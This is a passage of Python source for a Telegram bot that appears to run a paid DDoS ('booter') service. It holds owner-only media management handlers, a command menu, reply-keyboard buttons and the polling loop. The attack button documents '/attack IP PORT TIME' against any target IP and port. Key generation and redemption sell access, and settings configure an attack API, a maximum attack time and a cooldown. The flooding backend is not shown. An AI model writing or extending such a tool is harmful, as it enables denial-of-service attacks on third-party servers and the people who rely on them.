    p = msg.text.split()
    if len(p) < 2:
        if not data["videos"]:
            bot.reply_to(msg, "📹 No videos."); return
        txt = "📹 VIDEOS LIST:\n━━━━━━━━━━━━━━━━━━━━━\n"
        for i, v in enumerate(data["videos"], 1):
            txt += f"{i}. {v}\n"
        txt += "\nDelete: /delvideo NUMBER"
        bot.reply_to(msg, txt); return
    try:
        idx = int(p[1]) - 1
        if 0 <= idx < len(data["videos"]):
            data["videos"].pop(idx); save_data(data)
            bot.reply_to(msg, f"✅ Video #{p[1]} removed!\n📹 Total: {len(data['videos'])}")
        else: bot.reply_to(msg, "❌ Invalid number!")
    except: bot.reply_to(msg, "❌ Usage: /delvideo NUMBER")


# ============= PYF VIDEO =============
@bot.message_handler(commands=['addpyf'])
def cmd_addpyf(msg):
    if not is_owner(msg.from_user.id): return
    _pending_pyf[msg.from_user.id] = True
    bot.reply_to(msg, "📤 Send a video to add as PYF.")


@bot.message_handler(commands=['listpyf'])
def cmd_listpyf(msg):
    if not is_owner(msg.from_user.id): return
    if not data["pyf_videos"]:
        bot.reply_to(msg, "🎬 No PYF videos."); return
    txt = "🎬 PYF VIDEOS:\n━━━━━━━━━━━━━━━━━━━━━\n"
    for i, v in enumerate(data["pyf_videos"], 1):
        txt += f"{i}. {v}\n"
    txt += f"\n🔹 Total {len(data['pyf_videos'])}"
    bot.reply_to(msg, txt)


@bot.message_handler(commands=['delpyf'])
def cmd_delpyf(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        if not data["pyf_videos"]:
            bot.reply_to(msg, "🎬 No PYF videos."); return
        txt = "🎬 PYF VIDEOS LIST:\n━━━━━━━━━━━━━━━━━━━━━\n"
        for i, v in enumerate(data["pyf_videos"], 1):
            txt += f"{i}. {v}\n"
        txt += "\nDelete: /delpyf NUMBER"
        bot.reply_to(msg, txt); return
    try:
        idx = int(p[1]) - 1
        if 0 <= idx < len(data["pyf_videos"]):
            data["pyf_videos"].pop(idx); save_data(data)
            bot.reply_to(msg, f"✅ PYF Video #{p[1]} removed!\n🎬 Total: {len(data['pyf_videos'])}")
        else: bot.reply_to(msg, "❌ Invalid number!")
    except: bot.reply_to(msg, "❌ Usage: /delpyf NUMBER")


# ============= AUTO STICKER =============
@bot.message_handler(content_types=['sticker'])
def auto_sticker(msg):
    uid = msg.from_user.id
    if not is_owner(uid): return
    file_id = msg.sticker.file_id
    if file_id not in data["stickers"]:
        data["stickers"].append(file_id); save_data(data)
        bot.reply_to(msg, f"✅ Sticker added!\n❄ Total: {len(data['stickers'])}")
    else:
        bot.reply_to(msg, "ℹ️ Already added.")


# ============= VIDEO HANDLER =============
_pending_pyf = {}

@bot.message_handler(content_types=['video'])
def handle_video(msg):
    uid = msg.from_user.id
    if not is_owner(uid): return
    file_id = msg.video.file_id

    if _pending_pyf.get(uid):
        _pending_pyf[uid] = False
        if file_id not in data["pyf_videos"]:
            data["pyf_videos"].append(file_id); save_data(data)
            bot.reply_to(msg, f"✅ PYF Video added!\n🎬 Total: {len(data['pyf_videos'])}")
        else:
            bot.reply_to(msg, "ℹ️ Already added.")
    else:
        if file_id not in data["videos"]:
            data["videos"].append(file_id); save_data(data)
            bot.reply_to(msg, f"✅ Video added!\n📹 Total: {len(data['videos'])}")
        else:
            bot.reply_to(msg, "ℹ️ Already added.")


# ============= SETTINGS =============
@bot.message_handler(commands=['settings'])
def cmd_settings(msg):
    if not is_owner(msg.from_user.id): return
    txt = (
        "⚙️ ALL COMMANDS\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "👑 /panel\n"
        "👥 /users\n"
        "📊 /stats\n"
        "📢 /broadcast MSG\n"
        "🚫 /ban ID\n"
        "✅ /unban ID\n"
        "🔑 /genkey 1d 5 NAME\n"
        "🔑 /redeem KEY\n"
        "📡 /setapi URL TOKEN\n"
        "🧪 /testapi\n"
        "⏱️ /setmaxtime SEC\n"
        "⏸️ /setcooldown SEC\n"
        "🔧 /maintenance\n"
        "❄ /removesticker /liststickers\n"
        "📹 /listvideo /delvideo\n"
        "🎬 /addpyf /listpyf /delpyf"
    )
    bot.reply_to(msg, txt)


# ============= BUTTONS =============
@bot.message_handler(func=lambda m: m.text == "🔥 𝐀𝐓𝐓𝐀𝐂𝐊")
def btn_attack(msg):
    bot.reply_to(msg,
        "🔥 ATTACK COMMAND\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📌 Usage:\n"
        "/attack IP PORT TIME\n\n"
        "📝 Example:\n"
        "/attack 1.2.3.4 80 60\n\n"
        "🎯 IP: Target IP address\n"
        "🔌 PORT: Target port (1-65535)\n"
        "⏱️ TIME: Time in seconds")

@bot.message_handler(func=lambda m: m.text == "📊 𝐒𝐓𝐀𝐓𝐔𝐒")
def btn_status(msg): cmd_status(msg)

@bot.message_handler(func=lambda m: m.text == "👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄")
def btn_profile(msg): cmd_profile(msg)

@bot.message_handler(func=lambda m: m.text == "👑 𝐎𝐖𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋")
def btn_owner(msg):
    if not is_owner(msg.from_user.id): return
    bot.reply_to(msg, "👑 PANEL", reply_markup=kb_owner())

@bot.message_handler(func=lambda m: m.text == "🔑 𝐑𝐄𝐃𝐄𝐄𝐌")
def btn_redeem(msg):
    bot.reply_to(msg,
        "🔑 REDEEM KEY\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📌 Usage:\n"
        "/redeem YOUR-KEY\n\n"
        "📝 Example:\n"
        "/redeem ABCD-EFGH-IJKL-MNOP\n\n"
        "💡 Key lene ke liye owner se contact karo")

@bot.message_handler(func=lambda m: m.text == "🔑 𝐆𝐄𝐍 𝐊𝐄𝐘")
def btn_genkey(msg):
    bot.reply_to(msg,
        "🔑 GEN KEY\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "📌 Usage:\n"
        "/genkey 1d 5 [NAME]\n\n"
        "⏰ Duration:\n"
        "1d = day, 1h = hour\n"
        "1m = minute, 1s = second\n"
        "1month, 1week")

@bot.message_handler(func=lambda m: m.text == "📊 𝐒𝐓𝐀𝐓𝐒")
def btn_stats(msg): cmd_stats(msg)

@bot.message_handler(func=lambda m: m.text == "👥 𝐔𝐒𝐄𝐑𝐒")
def btn_users(msg): cmd_users(msg)

@bot.message_handler(func=lambda m: m.text == "📢 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓")
def btn_broadcast(msg):
    bot.reply_to(msg, "📢 /broadcast MSG")

@bot.message_handler(func=lambda m: m.text == "⚙️ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒")
def btn_settings(msg): cmd_settings(msg)

@bot.message_handler(func=lambda m: m.text == "❌ 𝐂𝐋𝐎𝐒𝐄")
def btn_close(msg):
    bot.reply_to(msg, "❌ Closed.", reply_markup=kb_main(msg.from_user.id))


# ============= MAIN =============
print("=" * 55)
print(f"  {BOT_NAME}")
print("=" * 55)
print(f"  👑 Owner: {BOT_OWNER}")
print(f"  📡 API: {get_setting('api_url', DEFAULT_API_URL)}")
print(f"  ⏱️ Max Time: {get_setting('max_attack_time', 300)}s")
print(f"  ⏸️ Cooldown: {get_setting('user_cooldown', 5)}s")
print("=" * 55)
print("  ✅ Bot running...")
print("=" * 55)

while True:
    try:
        bot.remove_webhook()
        time.sleep(0.5)
        bot.polling(
            none_stop=True,
            interval=0,
            timeout=20,
            long_polling_timeout=15,
            allowed_updates=["message", "callback_query"]
        )
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped.")
        break
    except Exception as e:
        print(f"⚠️ Polling Error: {e}")
        time.sleep(3)
